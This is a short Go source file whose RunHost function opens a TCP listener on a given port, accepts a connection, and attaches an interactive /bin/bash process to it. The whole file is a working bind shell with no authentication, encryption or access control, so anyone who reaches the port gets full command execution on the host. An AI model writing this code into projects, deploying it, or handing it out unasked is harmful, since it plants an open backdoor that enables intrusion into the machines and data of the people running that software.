package app

import (
	"fmt"
	"net"
	"os/exec"
)

func RunHost(port string) {
	fmt.Println("Running as host")
	listener, err := net.Listen("tcp", port)
	if err != nil {
		fmt.Println("Error listening:", err)
		return
	}

	conn, err := listener.Accept()
	if err != nil {
		fmt.Println("Error accepting:", err)
		return
	}

	// Start a new bash process
	cmd := exec.Command("/bin/bash")
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Stdin = conn

	// Start the command
	if err := cmd.Start(); err != nil {
		fmt.Println("Error starting command:", err)
		return
	}

	// Wait for the command to finish
	if err := cmd.Wait(); err != nil {
		fmt.Println("Error waiting for command:", err)
		return
	}
}
